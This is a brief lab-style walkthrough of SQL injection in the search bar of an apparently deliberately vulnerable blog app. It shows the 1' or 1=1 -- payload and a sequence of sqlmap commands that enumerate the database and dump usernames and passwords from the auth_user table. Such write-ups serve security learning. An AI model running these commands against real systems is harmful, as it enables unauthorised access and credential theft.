# Sql injection 

## SQLI in Search bar

In the search form field when the user searches for anything, the things the user just entered will go directly through the database and return the results to the user. So this is the vulnerable point

![image](https://user-images.githubusercontent.com/63194321/133385296-5295094c-49c4-4034-a3b0-3bc00fecfe3b.png)

We will check in this location.

First, we will search  `'`  on the search form. Result returned error

![image](https://user-images.githubusercontent.com/63194321/133388364-77edc108-4f68-4f64-ac21-bcd30f66c4db.png)

Now here we are pretty sure there will be an `SQLi` error. To be more sure, we will search with a payload `1' or 1=1 --`.

The result returns `all` posts in the database. So this is definitely an `In-band SQLi` vulnerability

### Solution
After determining that there is `In-band SQLi` at this address, we will use sqlmap to scan and attack

**B1.** Start Sqlmap and enter command to scan for `sqli` vulnerabilities:

`sqlmap -u "https://blog-vul.herokuapp.com/search/?search=d&tagId=chiase" --batch`

![image](https://user-images.githubusercontent.com/63194321/132506775-bfe319ad-d1e6-4b7d-9535-31730048cc07.png)

**B2.** Define a list of databases:

`sqlmap -u "https://blog-vul.herokuapp.com/search/?search=d&tagId=chiase" --batch --dbs`

![image](https://user-images.githubusercontent.com/63194321/132508430-06ebfa6b-66a3-4e06-bd35-7857fab4a5f0.png)

**B3.** Identify the tables in the database:

`sqlmap -u "https://blog-vul.herokuapp.com/search/?search=d&tagId=chiase" --batch -D public -tables`

![image](https://user-images.githubusercontent.com/63194321/132508803-98a9a86f-dca3-419c-84c7-f284a535c659.png)

**B4.** Define columns in tables:

`sqlmap -u "https://blog-vul.herokuapp.com/search/?search=d&tagId=chiase" --batch -D public -T auth_user -columns`

![image](https://user-images.githubusercontent.com/63194321/132509383-9d885446-6ffb-4409-957a-ffeabfbac78e.png)

**B5.** Get the username and password values:

`sqlmap -u "https://blog-vul.herokuapp.com/search/?search=d&tagId=chiase" --batch -D public -T auth_user -C username, password --dump`

![image](https://user-images.githubusercontent.com/63194321/132510741-09017ecd-a95e-4cc5-8f45-b0129742314d.png)


